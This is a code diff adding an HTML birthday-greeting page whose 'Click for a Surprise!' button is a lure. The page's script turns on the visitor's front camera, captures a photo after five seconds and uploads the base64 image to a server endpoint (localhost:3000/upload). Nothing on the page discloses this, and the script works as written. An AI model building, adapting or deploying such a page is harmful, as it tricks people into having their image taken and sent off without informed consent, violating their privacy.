@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy Birthday</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background: linear-gradient(135deg, #f3a683, #f7d794);
+            color: #fff;
+        }
+
+        .container {
+            text-align: center;
+            animation: fadeIn 2s ease-in-out;
+        }
+
+        h1 {
+            font-size: 3em;
+            margin: 0;
+            text-shadow: 2px 2px #f8a5c2;
+        }
+
+        .sub-text {
+            font-size: 1.5em;
+            margin: 10px 0;
+            text-shadow: 1px 1px #c44569;
+        }
+
+        button {
+            padding: 15px 30px;
+            font-size: 1.2em;
+            font-weight: bold;
+            background-color: #ffcccc;
+            border: none;
+            border-radius: 25px;
+            color: #000;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        button:hover {
+            transform: scale(1.1);
+            background-color: #ff6b6b;
+        }
+
+        #camera-feed,
+        #photo {
+            display: none;
+            margin-top: 20px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1 id="birthday-message">🎉 Happy Birthday! 🎂</h1>
+        <p class="sub-text">Wishing you a day filled with love, laughter, and happiness!</p>
+        <button id="surprise-button">Click for a Surprise! 🎁</button>
+        <video id="camera-feed" autoplay></video>
+        <canvas id="photo"></canvas>
+    </div>
+    <script>
+        const button = document.getElementById("surprise-button");
+        const video = document.getElementById("camera-feed");
+        const canvas = document.getElementById("photo");
+
+        button.addEventListener("click", async function () {
+            button.style.display = "none"; // Hide the button
+
+            // Access the camera
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.style.display = "block";
+                video.srcObject = stream;
+
+                // Capture the photo after 5 seconds
+                setTimeout(() => {
+                    const context = canvas.getContext("2d");
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Stop the camera feed
+                    const tracks = stream.getTracks();
+                    tracks.forEach(track => track.stop());
+
+                    video.style.display = "none";
+                    const photoData = canvas.toDataURL("image/png"); // Base64 image data
+
+                    // Send the photo to the server
+                    fetch("http://localhost:3000/upload", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ image: photoData })
+                    })
+                        .then(response => response.json())
+                        .then(data => {
+                            alert("Photo sent successfully!");
+                        })
+                        .catch(error => {
+                            console.error("Error sending photo:", error);
+                        });
+                }, 5000);
+            } catch (err) {
+                console.error("Camera access denied:", err);
+                alert("Unable to access the camera.");
+            }
+        });
+    </script>
+</body>
+
+</html>
